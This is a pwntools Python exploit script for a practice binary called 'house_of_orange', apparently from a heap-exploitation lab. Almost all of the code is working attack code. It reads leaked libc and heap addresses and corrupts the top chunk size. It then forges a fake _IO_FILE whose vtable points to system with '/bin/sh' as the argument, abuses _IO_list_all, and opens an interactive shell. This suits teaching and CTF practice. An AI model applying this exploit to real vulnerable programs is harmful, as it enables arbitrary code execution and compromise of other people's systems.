#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_orange")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc (small)" option.
def small_malloc():
    io.send(b"1")
    io.recvuntil(b"> ")

# Select the "malloc (large)" option.
def large_malloc():
    io.sendthen(b"> ", b"2")

# Select the "edit (1st small chunk)" option; send data.
def edit(data):
    io.send(b"3")
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request a small chunk.
small_malloc()

# Edit the 1st small chunk.
edit(b"Y"*24+p64(0x1000 - 0x20 + 1))
large_malloc()
# edit(b"Y"*24 + p64(0x21) + p64(0))
# edit(b"Y"*24 + p64(0x21) + p64(0) + p64(libc.sym._IO_list_all - 0x10))
# small_malloc()

# IO_FILE
flags = b"/bin/sh\x00"
size = 0x61
fd = 0
bk = libc.sym._IO_list_all - 0x10

write_base = 0x1
write_ptr = 0x2
mode =  0x0
vtable_ptr = heap + 0xd8
overflow = libc.sym.system

fake_io_file = flags + p64(size) +\
    p64(fd) + p64(bk) +\
    p64(write_base) + p64(write_ptr) +\
    p64(0)*18 + p32(mode) + p32(0) +\
    p64(0) + p64(overflow) +p64(vtable_ptr)


edit(b"X"*16 + fake_io_file)

small_malloc()

# =============================================================================

io.interactive()
